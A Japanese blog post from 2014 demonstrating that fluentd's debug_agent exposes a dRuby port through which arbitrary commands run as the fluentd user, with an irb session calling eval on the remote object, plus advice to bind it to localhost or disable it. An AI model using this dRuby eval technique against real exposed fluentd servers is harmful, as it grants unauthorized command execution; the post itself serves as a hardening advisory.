---
layout: post
title: "fluentd に drb で接続してみた"
date: 2014-06-13 22:41:08 +0900
comments: true
categories: fluentd ruby drb
---
druby の口が公開されていたら、そのユーザーの権限で何でも実行できるはず、
ということで、ちょっと試してみました。

<!--more-->

## 対象バージョン

- `ruby` 2.1.2
- `fluentd` 0.10.49

## 環境の準備

vagrant 上で rbenv と ruby-build を使ってインストールした ruby 2.1.2 で

- `gem install fluentd`
- `fluentd --setup /vagrant/fluent`
- `fluentd -c /vagrant/fluent/fluent.conf &`

と起動して準備しておきました。

## 実行例

`irb` を起動しているユーザーと同じユーザーで `fluentd` も起動しているので、
特に面白いことはできそうになかったのですが、
`/proc/$$/cmdline` を確認すると `irb` 側ではなく、
ちゃんと `fluentd` 側で任意のコマンドが実行できていることがわかります。

    vagrant@fluentd-vm:~$ rbenv exec irb -r irb/completion --simple-prompt
    >> require 'drb'
    => true
    >> d = DRbObject.new_with_uri('druby://127.0.0.1:24230'); nil
    => nil
    >> d.method_missing(:send, :eval, "`id`")
    => "uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)\n"
    >> d.method_missing(:send, :eval, '`cat /proc/$PPID/cmdline`')
    => "/opt/rbenv/versions/2.1.2/bin/ruby\x00/opt/rbenv/versions/2.1.2/bin/fluentd\x00-c\x00/vagrant/fluent/fluent.conf\x00"

## 雑感

`root` 権限で起動しているなら `debug_agent` は有効にしない方が良さそうだし、
ローカルユーザーが `fluentd` の実行ユーザーの権限を使えるとまずい場合も有効にしない方が良さそうだと思いました。

また、知っている人には当たり前のことですが、
`drb` は外部に安全に公開できるものではないので、
使う場合も `localhost` だけ待ち受けるように制限すべきです。

td-agent は初期設定でそうなっているのですが、
`fluentd --setup` はそうなっていないので、
適切に設定を変更するなり firewall で塞ぐなりしておく必要がありそうです。

## td-agent 1.1.19-1 での初期設定

`127.0.0.1` だけで待ち受けるようになっていました。

    ## live debugging agent
    <source>
      type debug_agent
      bind 127.0.0.1
      port 24230
    </source>

## `fluentd --setup` で生成される設定

外からも受けつけるようになっていました。

    # Listen DRb for debug
    <source>
      type debug_agent
      port 24230
    </source>
